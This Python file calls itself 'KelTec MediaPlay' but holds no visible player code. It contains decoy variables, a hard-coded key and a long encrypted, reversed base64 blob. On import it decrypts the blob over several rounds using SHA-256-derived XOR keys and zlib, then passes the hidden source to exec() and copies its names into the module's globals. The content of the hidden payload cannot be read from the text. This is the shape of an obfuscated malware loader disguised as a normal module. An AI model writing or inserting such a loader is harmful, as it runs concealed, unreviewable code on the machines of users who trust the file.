# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 905747 ^ 654061
_lx1_1 = len("917ce0")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-429926)
_lx3_3 = 608735 * 0
_lx4_4 = 269215 ^ 676951
_K = 'b31fa2bc760f99f682245dea68eb8407788ed19a3bb64da97dfdfdb3adfb2f4f'
_M = 'aSZS6d/P9KeluUBD803t0dLoBSant7s31JDPmtx8oJ0/LRC925mx763vSRfyTevQ07QHK6fhvDCNl8rP3XehzWArHurazbW4prxC'
_D = '==wrTbEqJcL0UEETm752XWNq5ocGVvkG5XxfSIVv3OpwGbmfTi5fiTQXRe7TZbCLo0gK/vG8MG75UE96SQgAA3p8Jiy4YKYYiE18ml7YeM1MrnpPy89g3CtxipYJ/Cn/fF6AwkTVDZlQWl1AkwjEF1aM3GchOxNr+wa9OyZqELgL8NtmDeqsVA29CqpJaWbm9Egktdg27bHqCqT4UTQcsbUSM3h8kW37A6bjDAn8h9HiQQgp1D+1GTnR3MVz0jdI7u+OxzaiWyHkdCo8yRSLT0AV8zUM4fRHC72T141ty8oal20/FVJRl4P+XQ+jOHgDY886UjeEkRJKGWuE2kq+ul86Pjpggjpxp/ck7wNSX0KcWjecQ/URCFdzz/r0s1pI5eMlqDf9aPfM2EEBul4xGZSI2nLrMvhEpzhNIIkk8Ve9KScuExeFprC0kBFvdV1qJym6eLxgdPzMEeirUwEWJp65fq052/tlP5o+Znz38USkGrQn82yImjDjuvVuqcWy1se/3iJlWsfZqHkowEIsWZClCRA0GGxC4VubfTJL6GuYyAjYYZC1jHRGuwVQCEyafRHkyLPzhPFL9aRBLdQRphwYRFxqCwSDgxZhcPMO6cvslzqjFOvEMYxBzJtJwg4ZudMjf9Ny4MX9Nay+pkq5tN7yQUstVK8FeFyI+aJbW5MxSpB0wzoUuMmCSfBO/vorYW2zVQfmLM9q4HnAHRIWfbcRfhLYMBxd41J1Jt/gBqCEqSTuigDdWDim+ldFpWQT3iOM/Jm4a0VFoqtcwbKbM/4LnAYu/o1NgaHTt6/c/kZY68MG2JJDXQ7DGF0wmnPx9Scfo66SzXnbPkk2SmA5S4qLCvoCF1msZRybDf9Fcbo2v2fdxuaA75eRlgpr4/B81FkC/2GclvUm+YmOEpPVPw5WMrp7Em0qQmBDBcrK+DGlg65qytH0w7Xqc24Elb2dz+igjvljKR5MpgZ9K9Ixv7CE/RSzf1eFakI2f+4YWmwb9gdiP6T61Pys1jxsoKarhGzIUDOPx4sZLa1JZ6BPim0w989SWfB3hFXB6mIGM1i0nHCZJWxrLzNBUh7Hd0Fma0680fvzgsKKSo/ENAdJ6UtJdN4lyDiaXNByT9bmWt8g9Zpc6BYmY5m20Tq4b5CwLUFuvVuFB6j+Zu6HgXw7Phcx2NGm/75mXwi4vi5F/ricw+kJnDmqinrpqYCzcmfMbGlX7GAqtKy0TdWJhYAhKNOkGQZPVY78MdqC/g7cg8j+kacvMm8CD/ZXSEzVdGlgi/pbnIBIWMeT06X3kot7BRnBP4FLNUQeaje7ezvUwPWWP2BGsrbaOc+rjc3u/dPiq4a7k0uYGlsvwJU+958BVjzUM8kUsxjAaFKc3hdMVkHlrousTioEMPa0QQEp3KS+iHZuskFH7fs5So2ONfLaSyV5jOCLTECnVV1++nPpjeg/xTVt61++oLmLGWn1WBzBM2HEgaqmJ+uFNrMaXO7YQ/QYGL9xLPDmjRS/N6ndNwSnHhNdEzOcKeIgpn/YTRt8leKZWI7NSnCsEMPXvi48hRcxRDZVRIZDScBaCHraurdVTR1ocoxaYsfWYDS920S5zG2kdNzKwJykxNkHWrjfDeV9oKPwLLTZM9phyGZ6ha1STq0OqLge0Iv7'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})